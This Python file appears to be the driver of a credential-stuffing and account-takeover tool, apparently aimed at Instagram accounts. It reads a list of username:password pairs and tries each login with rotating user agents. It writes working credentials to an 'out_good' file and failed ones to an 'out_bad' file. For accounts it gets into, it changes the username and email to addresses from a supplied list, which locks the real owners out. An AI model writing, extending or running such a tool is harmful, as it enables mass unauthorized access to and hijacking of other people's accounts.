# -*- mode: python; coding: utf-8 -*-

assert str is not bytes

import os, os.path
import threading
import itertools
import time
from . import inst_checker
from . import get_useragent_func

ERROR_DELAY = 60.0

def try_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except (ValueError, OSError):
        pass

def safe_check(inst_checker_ctx):
    def thread_func():
        inst_checker_ctx.error_type = None
        inst_checker_ctx.error_str = None
        
        try:
            inst_checker.unsafe_check(inst_checker_ctx)
        except Exception as e:
            error_type = type(e)
            error_str = str(e)
            
            inst_checker_ctx.error_type = error_type
            inst_checker_ctx.error_str = error_str
    
    thr = threading.Thread(target=thread_func)
    thr.start()
    thr.join()
    
    return inst_checker

def safe_edit(inst_checker_ctx):
    def thread_func():
        inst_checker_ctx.error_type = None
        inst_checker_ctx.error_str = None
        
        try:
            inst_checker.unsafe_edit(inst_checker_ctx)
        except Exception as e:
            error_type = type(e)
            error_str = str(e)
            
            inst_checker_ctx.error_type = error_type
            inst_checker_ctx.error_str = error_str
    
    thr = threading.Thread(target=thread_func)
    thr.start()
    thr.join()
    
    return inst_checker

def main():
    in_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'in.txt')
    in_email_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'in_email.txt')
    out_good_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'out_good.txt')
    out_bad_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'out_bad.txt')
    out_edit_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'out_edit.txt')
    
    get_useragent = get_useragent_func.GetUseragentFunc()
    
    in_fd = open(in_path, mode='r', encoding='utf-8', errors='replace')
    out_good_fd = open(out_good_path, mode='w', encoding='utf-8', newline='\n')
    out_bad_fd = open(out_bad_path, mode='w', encoding='utf-8', newline='\n')
    out_edit_fd = open(out_edit_path, mode='w', encoding='utf-8', newline='\n')
    
    try:
        in_email_fd = open(in_email_path, mode='r', encoding='utf-8', errors='replace')
    except OSError:
        in_email_fd = None
    
    email_list = []
    if in_email_fd is not None:
        for in_email_line in in_email_fd:
            email_line = in_email_line.strip()
            if not email_line:
                continue
            email_list.append(email_line)
    email_iter = itertools.cycle(email_list)
    
    for in_line in in_fd:
        line = in_line.strip()
        in_line_split = line.split(sep=':')
        
        if len(in_line_split) < 2:
            continue
        
        ua_name = get_useragent()
        username = in_line_split[0].strip()
        password = in_line_split[1].strip()
        
        try_print('begin:', username)
        
        inst_checker_ctx = inst_checker.InstCheckerCtx()
        inst_checker.init_inst_checker_ctx(inst_checker_ctx, ua_name, username, password)
        
        if email_list:
            inst_checker_ctx.email_iter = email_iter
        
        safe_check(inst_checker_ctx)
        
        if inst_checker_ctx.error_type is not None:
            try_print('error:', inst_checker_ctx.error_type, inst_checker_ctx.error_str)
            time.sleep(ERROR_DELAY)
            
            continue
        
        if inst_checker_ctx.is_auth:
            out_good_fd.write('{}\n'.format(line))
            out_good_fd.flush()
        else:
            out_bad_fd.write('{}\n'.format(line))
            out_bad_fd.flush()
        
        try_print('auth result:', inst_checker_ctx.is_auth)
        
        if not email_list:
            continue
        
        safe_edit(inst_checker_ctx)
        
        if not inst_checker_ctx.is_auth:
            continue
        
        if inst_checker_ctx.is_edit_begin:
            out_edit_fd.write('{}:{}:{}:{}\n'.format(
                inst_checker_ctx.new_username,
                inst_checker_ctx.new_email,
                password,
                inst_checker_ctx.is_edit,
            ))
            out_edit_fd.flush()
        
        try_print('edit result:', inst_checker_ctx.is_edit_begin, inst_checker_ctx.is_edit)
        
        if inst_checker_ctx.error_type is not None:
            try_print('error:', inst_checker_ctx.error_type, inst_checker_ctx.error_str)
            time.sleep(ERROR_DELAY)
            
            continue
    
    try_print('all done!')
